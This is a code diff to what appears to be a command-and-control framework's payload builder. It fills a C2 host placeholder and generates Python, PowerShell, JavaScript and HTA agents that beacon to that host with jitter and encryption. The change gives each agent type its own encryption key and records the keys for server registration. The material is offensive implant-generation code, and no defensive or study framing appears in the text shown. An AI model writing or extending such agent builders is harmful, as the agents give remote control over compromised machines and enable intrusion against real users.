@@ -953,7 +953,9 @@ def {cmd_func}(cmd):
         # Generate unique key if requested
         if unique_key:
             encryption_key = self.generate_unique_encryption_key()
-            print(f"[*] Generated unique encryption key: {encryption_key}")
+            if not hasattr(self, 'generated_keys'):
+                self.generated_keys = []
+            self.generated_keys.append(encryption_key)
 
         # Replace placeholders
         content = content.replace("{{C2_HOST}}", c2_host)
@@ -1689,6 +1691,7 @@ unsigned int {var_name}_len = {len(data)};
             generate_multi_os: Generate agents for all OS types
         """
         results = {}
+        self.generated_keys = []  # Track all unique keys for server registration
 
         # If multi-OS requested, generate for all platforms
         if generate_multi_os:
@@ -1697,7 +1700,7 @@ unsigned int {var_name}_len = {len(data)};
         else:
             os_list = [target_os]
 
-        # Generate Python agents for each OS
+        # Generate Python agents for each OS (each gets its own unique key)
         for os_type in os_list:
             try:
                 os_key = f'python_{os_type}' if generate_multi_os else 'python'
@@ -1716,8 +1719,12 @@ unsigned int {var_name}_len = {len(data)};
                 results[os_key] = f"Error: {str(e)}"
                 print(f"[-] Python agent failed ({os_type}): {str(e)}")
 
+        # Generate unique keys for PS/JS/HTA agents too
+        ps_key = self.generate_unique_encryption_key() if unique_key else encryption_key
+        if unique_key:
+            self.generated_keys.append(ps_key)
         try:
-            results['powershell'] = self.generate_powershell_agent(c2_host, c2_port, encryption_key,
+            results['powershell'] = self.generate_powershell_agent(c2_host, c2_port, ps_key,
                                                                      transport=transport, beacon_interval=beacon_interval,
                                                                      beacon_jitter=beacon_jitter)
             print(f"[+] PowerShell agent generated: {results['powershell']}")
@@ -1725,8 +1732,11 @@ unsigned int {var_name}_len = {len(data)};
             results['powershell'] = f"Error: {str(e)}"
             print(f"[-] PowerShell agent failed: {str(e)}")
 
+        js_key = self.generate_unique_encryption_key() if unique_key else encryption_key
+        if unique_key:
+            self.generated_keys.append(js_key)
         try:
-            results['javascript'] = self.generate_javascript_agent(c2_host, c2_port, encryption_key,
+            results['javascript'] = self.generate_javascript_agent(c2_host, c2_port, js_key,
                                                                      transport=transport, beacon_mode=beacon_mode,
                                                                      beacon_interval=beacon_interval, beacon_jitter=beacon_jitter)
             print(f"[+] JavaScript agent generated: {results['javascript']}")
@@ -1734,8 +1744,11 @@ unsigned int {var_name}_len = {len(data)};
             results['javascript'] = f"Error: {str(e)}"
             print(f"[-] JavaScript agent failed: {str(e)}")
 
+        hta_key = self.generate_unique_encryption_key() if unique_key else encryption_key
+        if unique_key:
+            self.generated_keys.append(hta_key)
         try:
-            results['hta'] = self.generate_hta_agent(c2_host, c2_port, encryption_key,
+            results['hta'] = self.generate_hta_agent(c2_host, c2_port, hta_key,
                                                          transport=transport, beacon_interval=beacon_interval,
                                                          beacon_jitter=beacon_jitter)
             print(f"[+] HTA agent generated: {results['hta']}")
